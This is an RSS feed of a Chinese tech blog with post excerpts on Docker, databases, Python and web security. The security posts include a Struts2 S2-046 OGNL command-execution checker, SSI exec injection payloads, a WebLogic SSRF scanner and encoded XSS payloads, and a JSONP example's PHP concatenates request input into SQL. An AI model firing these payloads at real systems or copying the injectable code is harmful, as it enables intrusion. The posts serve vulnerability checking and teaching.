<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on </title>
    <link>http://wyb0.com/posts/</link>
    <description>Recent content in Posts on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Fri, 18 Aug 2017 18:05:43 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Dockerfile</title>
      <link>http://wyb0.com/posts/docker-dockerfile/</link>
      <pubDate>Fri, 18 Aug 2017 18:05:43 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/docker-dockerfile/</guid>
      <description>操作系统：Ubuntu14.04.1
0x00 Dockerfile  Dockerfile里面其实是一条条的指令，Docker会把Dockerfile的指令翻译为linux命令， 让你可以对下载好的镜像进行一些操作(比如安装软件、向镜像复制文件等)，从而构造定制化的镜像。   0x01 Dockerfile基本指令  FROM &amp;lt;image name&amp;gt;：指定新的镜像基于什么创建 MAINTAINER &amp;lt;author name&amp;gt;：设置该镜像的作者 COPY &amp;lt;source&amp;gt; &amp;lt;dest&amp;gt;：复制文件，dest要以 / 结尾 WORKDIR /path/to/workdir：相当于切换目录，对RUN、CMD、和ENTRYPOINT生效 RUN &amp;lt;command&amp;gt;：在shell执行命令 EXPOSE port1 port2：容器运行时监听的端口 CMD：容器默认的执行命令，Dockerfile只允许使用一次CMD命令(使用数组) ENTRYPOINT：类似于CMD，Dockerfile只允许使用一次(使用数组) ENV &amp;lt;key&amp;gt; &amp;lt;value&amp;gt;：设置环境变量 USER &amp;lt;uid&amp;gt;：镜像正在运行时设置一个uid，即设定启动容器的用户，默认为root VOLUME [&#39;/data&#39;]：授权访问从容器内到主机的目录   0x02 实例    Dockerfile   reber@wyb:~/range$ cat Dockerfile FROM ubuntu:14.04.4 MAINTAINER reber ENV MYSQL_ALLOW_EMPTY_PASSWORD yes COPY src/sources.list /etc/apt/sources.list RUN apt-get update &amp;amp;&amp;amp; apt-get upgrade -y COPY src/range.</description>
    </item>
    
    <item>
      <title>Docker之镜像与容器</title>
      <link>http://wyb0.com/posts/docker-image-and-container/</link>
      <pubDate>Fri, 18 Aug 2017 14:36:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/docker-image-and-container/</guid>
      <description>操作系统：Ubuntu14.04.1
0x00 Docker安装与卸载  #安装 $ sudo apt-get update $ sudo apt-get install apt-transport-https ca-certificates curl software-properties-common $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - # Verify that the key fingerprint is 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 $ sudo apt-key fingerprint 0EBFCD88 $ sudo add-apt-repository &amp;quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&amp;quot; $ sudo apt-get update $ sudo apt-get install docker-ce $ sudo docker info #查看是否安装成功  #卸载 $ sudo apt-get purge docker-ce $ sudo rm -rf /var/lib/docker  #添加当前用户到docker组 $ sudo gpasswd -a ${USER} docker $ sudo service docker restart $ newgrp - docker   0x01 镜像操作  下载镜像   #一般容器的id和name可以互换 $ docker search ubuntu #从公共registry搜索镜像 $ docker pull ubuntu #从公共registry下载镜像 $ docker pull ubuntu:14.</description>
    </item>
    
    <item>
      <title>Docker初识</title>
      <link>http://wyb0.com/posts/docker-basis/</link>
      <pubDate>Tue, 15 Aug 2017 22:16:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/docker-basis/</guid>
      <description>0x00 关于Docker  Docker中的镜像类似VM的快照，容器类似虚拟机，使用镜像创建容器类似于使用快照创建虚拟机。 Docker中运行应用的是容器，容器的创建和销毁在秒级就能完成。 Docker使用了AUFS，可以以递进的方式创建&amp;rdquo;VM&amp;rdquo;，一个&amp;rdquo;VM&amp;rdquo;叠在另一个&amp;rdquo;VM&amp;rdquo;上，就像使用git增量开发一样。 软件的运行环境（image）和软件本身（container）分离，和数据也分离。
 学习Docker需要了解4个概念：镜像、容器、数据卷、链接
  0x01 镜像image  Docker Images 只是一个只读模板，用来运行Docker容器，可以在Docker hub(官方镜像库)下载。 镜像拥有唯一ID(比如：72c989e2d109)以及一个供人阅读的名字和标签对(比如：ubuntu:latest)。 镜像必须完全可移植,Docker不允许例外。  0x02 容器container  可以在一个镜像的基础上创建多个容器，每个容器相互独立。 容器也拥有唯一ID以及一个供人阅读的名字。 容器被启动时会被分配一个随机的私有IP，其他容器可以通过这个IP与它进行通信。 Docker允许公开容器的特定端口。 一个容器一个进程，容器设计本意是用来运行一个应用的而非一台机器。 容器应该是短暂和一次性的。 Docker镜像层对于容器来说，是只读的，容器对于文件的写操作绝对不会作用在镜像中。  0x03 数据卷  数据卷表现为容器内的空间，但实际保存在容器外，你可以在不影响数据的情况下销毁、重建、修改、丢弃容器。 Docker允许你定义应用和数据部分，并提供工具让你可以将它们分开。  0x04 链接  Docker允许你在创建一个新容器时引用其它现存容器，在你刚创建的容器里被引用的容器将获得一个你指定的别名，我们就说这两个容器被链接在了一起。 若DB容器已经在运行，我们可以创建一个Web服务器容器，并在创建时引用这个DB容器，可以给它起个别名(比如dbapp)，在新创建的Web服务器容器中，可以在任何时候使用主机名dbapp与DB容器进行通信。  0x05 镜像与容器关系  Docker镜像是一个文件，属于静态的内容；Docker容器属于动态的内容，可以把容器理解为一个或多个运行进程。 Docker可以通过解析Docker镜像的json文件，获知应该在这个镜像之上运行什么样的进程，应该为进程配置怎么样的环境变量。 Docker守护进程手握Docker镜像的json文件，它为容器配置相应的环境并真正运行Docker镜像所指定的进程，从而完成Docker容器的真正创建。 当Docker容器运行起来之后，Docker镜像json文件就失去作用了。此时Docker镜像的绝大部分作用就是：为Docker容器提供一个文件系统的视角，供容器内部的进程访问文件资源。  0x06 Docker有三个组件和三个基本元素  三个组件
 Docker Daemon 运行于主机上，处理服务请求，是用于管理容器的后台进程，上面有一些api接口。 Docker Client 用于操作容器，它是Deamon的api接口(如docker start、docker rm等)的封装。 Docker Index 是中央registry，支持拥有公有与私有访问权限的Docker容器镜像的备份。  三个基本要素</description>
    </item>
    
    <item>
      <title>[转]HTTPS加密原理简介</title>
      <link>http://wyb0.com/posts/introduction-to-https-encryption-principles/</link>
      <pubDate>Tue, 01 Aug 2017 18:16:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/introduction-to-https-encryption-principles/</guid>
      <description>参考链接：http://www.cnblogs.com/JeffreySun/archive/2010/06/24/1627247.html
0x00 对称加密与非对称加密  对称加密算法的加密和解密秘钥一样，不区分公钥和私钥，秘钥对外保密. 非对称加密算法的加密秘钥和解密秘钥不一样，公钥加密的内容只能由私钥解密，私钥加密的内容只能由公钥解密，其中私钥保密，公钥公开.  0x01 加密通信基本流程  Step1：
客户端&amp;ndash;&amp;gt;服务器：你好
 Step2：
服务器&amp;ndash;&amp;gt;客户端：你好，我是服务器
 Step3：
客户端&amp;ndash;&amp;gt;服务器：向我证明你是服务器
 Step4：
服务器&amp;ndash;&amp;gt;客户端：
 服务器生成随机字符串string 服务器用自己的私钥加密string，生成密文str 服务器把string和str发送给客户端  Step5：
客户端&amp;ndash;&amp;gt;服务器：
 客户端收到服务器的数据后，用服务器的公钥解密str，生成string1 客户端将string1和string对比，若一致则说明对方确实是服务器(因为私钥加密后的内容只能由公钥解密，私钥只有服务器持有) 客户端选择一个对称加密算法和一个秘钥，用服务器公钥将他们加密发送给服务器，告诉服务器后续的通信用这个秘钥加密，因为公钥加密的数据只有私钥能解密，所以对称加密的算法和秘钥只有服务器知道  Step6：
服务器&amp;ndash;&amp;gt;客户端： 服务器用私钥解密收到的数据得到对称加密算法及其秘钥
 Step7:
后面客户端和服务器就用对称加密算法进行通信
  0x02 https通信大致原理  在上面的通信过程中存在一些问题：客户端如何获得公钥？如何确保获得的公钥就是服务器的？
如果黑客生成一对公私钥，然后发给用户的话同样可以完成上述认证流程。
而证书正是为了解决这一问题而存在的，只要改变上面的Step3和Step4即可引入证书。
  Step1：
客户端&amp;ndash;&amp;gt;服务器：你好
 Step2：
服务器&amp;ndash;&amp;gt;客户端：你好，我是服务器(同时发送证书)
 Step3：
客户端&amp;ndash;&amp;gt;服务端：
 判断证书是否为服务器的(证书中有服务器的公钥，若证书是服务器的则这个公钥就也是服务器的) 客户端向服务器发送随机生成的字符串string  Step4：
服务端&amp;ndash;&amp;gt;客户端：
 服务器把string用自己的私钥进行加密，生成str 服务器把str发送给客户端
  Step5：</description>
    </item>
    
    <item>
      <title>使用Python读写xml文件</title>
      <link>http://wyb0.com/posts/python-read-and-write-xml/</link>
      <pubDate>Thu, 20 Jul 2017 14:20:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-read-and-write-xml/</guid>
      <description>0x00 解析XML的方法  SAX (simple API for XML)
python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。
 DOM(Document Object Model)
将XML数据在内存中解析成一个树，通过对树的操作来操作XML。
 ElementTree(元素树)
ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。
   我在这里使用ElementTree  0x01 Element对象的属性  每个Element对象都具有以下属性：
  tag：string对象，表示数据代表的种类 attrib：dictionary对象，表示附有的属性 text：string对象，表示element的内容 tail：string对象，表示element闭合之后的尾迹 若干子元素（child elements）   &amp;gt;&amp;gt;&amp;gt; from xml.etree import ElementTree as ET &amp;gt;&amp;gt;&amp;gt; xml = &amp;quot;&amp;quot;&amp;quot;&amp;lt;books&amp;gt; ... &amp;lt;book id=&#39;37476&#39;&amp;gt;aaaa&amp;lt;/book&amp;gt; ... &amp;lt;book id=&#39;83727&#39;&amp;gt;bbbb&amp;lt;/book&amp;gt; ... &amp;lt;/books&amp;gt;&amp;quot;&amp;quot;&amp;quot; &amp;gt;&amp;gt;&amp;gt; root = ET.fromstring(xml) &amp;gt;&amp;gt;&amp;gt; root.tag &#39;books&#39; &amp;gt;&amp;gt;&amp;gt; child = root.getchildren() &amp;gt;&amp;gt;&amp;gt; child [&amp;lt;Element &#39;book&#39; at 0x106f59410&amp;gt;, &amp;lt;Element &#39;book&#39; at 0x106f59450&amp;gt;] &amp;gt;&amp;gt;&amp;gt; child[0].</description>
    </item>
    
    <item>
      <title>MRQ的使用</title>
      <link>http://wyb0.com/posts/python-module-mrq/</link>
      <pubDate>Mon, 10 Jul 2017 16:30:43 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-mrq/</guid>
      <description>0x00 MRQ  MRQ是Python基于Redis、Mongo和gevent的分布式任务队列。 MRQ一方面旨在像RQ一样简单，另一方面有接近Celery的性能。 MRQ最初的功能设计是为了满足任务队列的各种任务需求(IO密集&amp;amp;CPU密集，很多小任务&amp;amp;几个大任务)。  0x01 设置mongo和redis  因为mrq依赖于redis和mongo，所以先安装设置下
  安装redis   $ sudo apt-get install redis-server $ netstat -nlt|grep 6379 $ sudo /etc/init.d/redis-server status  $ sudo /etc/init.d/redis-server stop $ sudo vim /etc/redis/redis.conf #bind 127.0.0.1 requirepass reber_redis $ sudo redis-server /etc/redis/redis.conf &amp;amp; $ redis-cli &amp;gt; auth reber_redis    安装mongo   可以参考：https://docs.mongodb.com/master/tutorial/install-mongodb-on-ubuntu/
$ sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 0C49F3730359A14518585931BC711F9BA15703C6 $ echo &amp;quot;deb [ arch=amd64 ] http://repo.</description>
    </item>
    
    <item>
      <title>AJAX之跨域</title>
      <link>http://wyb0.com/posts/ajax-cross-domain/</link>
      <pubDate>Thu, 22 Jun 2017 15:18:29 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ajax-cross-domain/</guid>
      <description>0x00 简介  当使用AJAX请求其他域名下的数据时会出现拒绝访问的情况，这是出于安全考虑，AJAX只能访问本地的资源，而不能跨域访问。
当使用AJAX与PHP中的代码请求其他域的数据时会出现下面的情况 至于解决方案的话这里说三种：JSONP、jQuery、CORS。
 0x01 JSONP  这里的场景是本地127站点跨域请求远程114.115.214.111站点的数据
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;jsonptest&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;script&amp;gt; function callback_func(data) { document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=&amp;quot;姓名:&amp;quot;+data.name+&amp;quot;--性别:&amp;quot;+data.sex+&amp;quot;--年龄:&amp;quot;+data.age; } function get_msg(name) { var url = &amp;quot;http://114.115.214.111/wyb/msg.php?name=&amp;quot;+name+&amp;quot;&amp;amp;callback=callback_func&amp;quot;; var script = document.createElement(&#39;script&#39;); script.setAttribute(&#39;src&#39;, url); script.setAttribute(&#39;id&#39;, &#39;aaabbb&#39;); document.getElementsByTagName(&#39;head&#39;)[0].appendChild(script); document.getElementById(&#39;aaabbb&#39;).remove(); } &amp;lt;/script&amp;gt; &amp;lt;h3&amp;gt;在输入框中尝试输入姓名(xiaoming):&amp;lt;/h3&amp;gt; &amp;lt;form action=&amp;quot;&amp;quot;&amp;gt; 输入姓名: &amp;lt;input type=&amp;quot;text&amp;quot; onkeyup=&amp;quot;get_msg(this.value)&amp;quot; /&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;p&amp;gt;提示信息: &amp;lt;span id=&amp;quot;txtHint&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  &amp;lt;?php $conn = @mysql_connect(&#39;localhost&#39;,&#39;admin&#39;,&#39;123456&#39;); mysql_select_db(&#39;test&#39;,$conn); $name = $_GET[&#39;name&#39;]; $callback = $_GET[&#39;callback&#39;]; $sql = &amp;quot;select * from student where name=&#39;&amp;quot;.</description>
    </item>
    
    <item>
      <title>SSI注入</title>
      <link>http://wyb0.com/posts/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ssi-injection/</guid>
      <description> 0x00 SSI  SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
若注入点在url中则可能需要进行url编码
 0x01 payload  &amp;quot;--&amp;gt;&#39;--&amp;gt;`--&amp;gt;&amp;lt;!--#set var=&amp;quot;a&amp;quot; value=&amp;quot;123&amp;quot;--&amp;gt;&amp;lt;!--#set var=&amp;quot;b&amp;quot; value=&amp;quot;654&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;a&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;b&amp;quot;--&amp;gt; &amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt; &amp;lt;!--#exec cmd=&amp;quot;dir&amp;quot; --&amp;gt;   0x02 示例  Referer被输出到了页面中     url中的数据被输出到页面中(有时候url中的payload需要url编码)    </description>
    </item>
    
    <item>
      <title>SQLServer存储过程</title>
      <link>http://wyb0.com/posts/sqlserver-stored-procedure/</link>
      <pubDate>Tue, 30 May 2017 13:16:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/sqlserver-stored-procedure/</guid>
      <description>0x00 数据表结构  CREATE DATABASE student; CREATE TABLE info ( id INT IDENTITY(1,1) PRIMARY KEY NOT NULL, name VARCHAR(20) NOT NULL DEFAULT &#39;xiaoming&#39;, sex INT NOT NULL DEFAULT 1, age INT NOT NULL DEFAULT 0, hight INT NOT NULL DEFAULT 0 ) INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaohong&#39;,0,23,165); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaogang&#39;,1,24,175); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaoliu&#39;,1,21,160); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaozhang&#39;,1,19,165); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaoli&#39;,1,23,170); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaohua&#39;,0,23,160); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaoming&#39;,1,21,165); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaowang&#39;,1,23,166); INSERT INTO info(name,sex,age,hight) VALUES(&#39;xiaojuan&#39;,0,21,159);   0x01 存储过程  --如果存在名为get_student_msg(相当于函数)的存储过程则删除 IF EXISTS (SELECT name FROM sysobjects WHERE name=&#39;get_student_msg&#39; AND type=&#39;p&#39;) DROP PROCEDURE get_student_msg CREATE PROCEDURE get_student_msg --创建存储过程 @name VARCHAR(20) --声明全局变量 AS BEGIN SELECT * from info WHERE name=@name END GO --创建好存储过程后在其他地方直接使用函数并传参就行了 EXEC get_student_msg &#39;xiaoli&#39;   0x02 使用游标的存储过程  -- 使用DECLARE声明局部变量，一般在函数和存储过程中使用 DECLARE @name VARCHAR(20) DECLARE @sex INT DECLARE @age INT DECLARE @hight INT DECLARE stu_cursor CURSOR FOR --定义游标，后面跟sql语句 SELECT name,sex,age,hight --使用游标的对象(根据需要写select语句) FROM dbo.</description>
    </item>
    
    <item>
      <title>SQLServer的基本使用</title>
      <link>http://wyb0.com/posts/sqlserver-bisis-use/</link>
      <pubDate>Tue, 30 May 2017 12:53:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/sqlserver-bisis-use/</guid>
      <description>0x00 数据库  -- 创建数据库 CREATE DATABASE student; -- 选择数据库 USE student; -- 查看当前数据库 SELECT DB_NAME(); -- 查看当前数据库 SELECT DB_NAME(); -- 查看数据库版本 SELECT @@version;   0x01 数据表  -- 创建数据库表 CREATE TABLE info ( id INT IDENTITY(1,1) PRIMARY KEY NOT NULL, name VARCHAR(20) NOT NULL DEFAULT &#39;xiaoming&#39;, sex INT NOT NULL DEFAULT 1 ) -- 查看表结构 EXEC sp_help &#39;info&#39;; -- 更新表结构 ALTER TABLE info add age int; -- 添加一列 ALTER TABLE info DROP COLUMN age; -- 删除一列 -- 插入数据 INSERT INTO info(name,sex) VALUES(&#39;xiaohong&#39;,0); -- 查看数据 SELECT * FROM dbo.</description>
    </item>
    
    <item>
      <title>MongoDB的基本使用</title>
      <link>http://wyb0.com/posts/mongodb-basis-use/</link>
      <pubDate>Thu, 25 May 2017 15:33:12 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/mongodb-basis-use/</guid>
      <description>0x00 角色和权限  Mongo的授权采用了角色授权的方法，每个用户都有一组权限，Monog内建角色权限如下：
  数据库用户角色  read：允许用户读取指定数据库 readWrite：允许用户读写指定数据库  数据库管理角色  dbOwner：包含readWrite、dbAdmin、userAdmin dbAdmin：允许用户在指定数据库中对集合、文档等操作 userAdmin：允许用户向system.users集合写入，可以在指定数据库里创建、删除和管理用户  集群管理角色  clusterAdmin：只在admin数据库中可用，包含clusterManager、clusterMonitor、hostManager clusterManager： clusterMonitor： hostManager  备份和恢复角色  backup restore  所有数据库角色  readAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读权限 readWriteAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读写权限 dbAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限 userAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的userAdmin权限  超级用户角色  root：只在admin数据库中可用。超级账号，超级权限  内部角色  __system   0x01 创建用户  #创建管理员用户 &amp;gt; use admin switched to db admin &amp;gt; db.createUser({ ... user:&amp;quot;root&amp;quot;, ... pwd:&amp;quot;root123&amp;quot;, ... roles:[{&amp;quot;role&amp;quot;:&amp;quot;root&amp;quot;,&amp;quot;db&amp;quot;:&amp;quot;admin&amp;quot;}] ... }) Successfully added user: { &amp;quot;user&amp;quot; : &amp;quot;root&amp;quot;, &amp;quot;roles&amp;quot; : [ { &amp;quot;role&amp;quot; : &amp;quot;root&amp;quot;, &amp;quot;db&amp;quot; : &amp;quot;admin&amp;quot; } ] } &amp;gt; db.</description>
    </item>
    
    <item>
      <title>Mac基础设置</title>
      <link>http://wyb0.com/posts/mac-basic-use/</link>
      <pubDate>Fri, 19 May 2017 16:51:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/mac-basic-use/</guid>
      <description>0x00 安装brew  $ /usr/bin/ruby -e &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;quot;   0x01 安装wget  $ brew install wget   0x02 安装oh-my-zsh  $ wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh $ cat /etc/shells #查看当前有什么shell $ which zsh #查看zsh路径 $ chsh -s /bin/zsh #切换shell为zsh $ vim ~/.zshrc添加alias c=&#39;clear&#39;   0x03 换源  # 对于zsh用户换源 $ echo &#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#39; &amp;gt;&amp;gt; ~/.zshrc $ source ~/.zshrc $ brew update   0x04 安装scroll-reverser  $ brew install scroll-reverser   0x05 安装java  $ brew install java   0x06 安装iterm2  去http://www.</description>
    </item>
    
    <item>
      <title>Struts2 046</title>
      <link>http://wyb0.com/posts/struts2-046/</link>
      <pubDate>Sun, 16 Apr 2017 17:44:01 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/struts2-046/</guid>
      <description>Struts2 046  前段时间写的struts2 046检测脚本，代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,&#39;http://127.0.0.1:1080&#39;) return c def check(curl, url): head = [ &#39;Connection: close&#39;, &#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&#39; ] data = &#39;&#39;&#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;quot;foo&amp;quot;; filename=&amp;quot;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo dd996b71024fa97cd015f06a7f24ed30&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&#39;&#39;&#39; buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.</description>
    </item>
    
    <item>
      <title>下载大文件时显示进度条</title>
      <link>http://wyb0.com/posts/python-module-tqdm/</link>
      <pubDate>Sat, 15 Apr 2017 18:49:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-tqdm/</guid>
      <description> 0x00 作用  在下载大文件时以进度条的形式显示下载进度，如下图所示：  0x01 代码  #!/usr/bin/env python # -*- coding: utf-8 -*- import requests from tqdm import tqdm def get_vedio(url,name): resp = requests.get(url=url,stream=True) content_size = int(resp.headers[&#39;Content-Length&#39;])/1024 with open(name, &amp;quot;wb&amp;quot;) as f: print &amp;quot;total: &amp;quot;,content_size,&#39;k&#39; for data in tqdm(iterable=resp.iter_content(1024),total=content_size,unit=&#39;k&#39;): f.write(data) print &amp;quot;done &amp;quot;+name if __name__ == &#39;__main__&#39;: url = &amp;quot;http://127.0.0.1/Video.mp4&amp;quot; name = url.split(&#39;/&#39;)[-1] get_vedio(url,name)   </description>
    </item>
    
    <item>
      <title>检测WebLogic是否存在SSRF</title>
      <link>http://wyb0.com/posts/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/weblogic-ssrf-check/</guid>
      <description>0x00 检测脚本如下  #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Weblogic_SSRF_Check(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for Weblogic_SSRF_Check&amp;quot;&amp;quot;&amp;quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &amp;quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,html) if m: mutex.acquire() with open(&#39;ssrf.txt&#39;,&#39;a+&#39;) as f: print &amp;quot;%s has weblogic ssrf.</description>
    </item>
    
    <item>
      <title>XSS中的编码</title>
      <link>http://wyb0.com/posts/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/xss-encode/</guid>
      <description>0x00 浏览器解析  浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分   0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
 实体编码
&amp;amp;开头分号结尾，如 &amp;quot;&amp;lt;&amp;quot; 的编码是 &amp;quot;&amp;amp;lt;&amp;quot;  字符编码
样式为&amp;quot;&amp;amp;#数值;&amp;quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&amp;quot;&amp;lt;&amp;quot;可编码为&amp;quot;&amp;amp;#060;&amp;quot;和&amp;quot;&amp;amp;#x3c;&amp;quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\x3c&amp;quot; 2、三个八进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\074&amp;quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&amp;quot;&amp;lt;&amp;quot;编码为&amp;quot;\u003c&amp;quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&amp;quot;e&amp;quot;为&amp;quot;\65&amp;quot;或&amp;quot;65&amp;quot;或&amp;quot;00065&amp;quot;   0x02 编码与解码顺序  解码时先解码最外层，编码时先编码最内层
如&amp;lt;td onclick=&amp;quot;openUrl(add.do?userName=&#39;{$value}&#39;);&amp;quot;&amp;gt;11&amp;lt;/td&amp;gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&amp;gt;js解码-&amp;gt;url解码 编码顺序为：url编码-&amp;gt;js编码-&amp;gt;html编码   0x03 利用  八进制
&amp;lt;p id=&amp;quot;test&amp;quot;&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; var test = &amp;quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&amp;quot;; var p = document.getElementById(&#39;test&#39;); #这里会进行js解码 p.</description>
    </item>
    
    <item>
      <title>Python的pycurl模块</title>
      <link>http://wyb0.com/posts/python-module-pycurl/</link>
      <pubDate>Tue, 21 Mar 2017 23:18:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-pycurl/</guid>
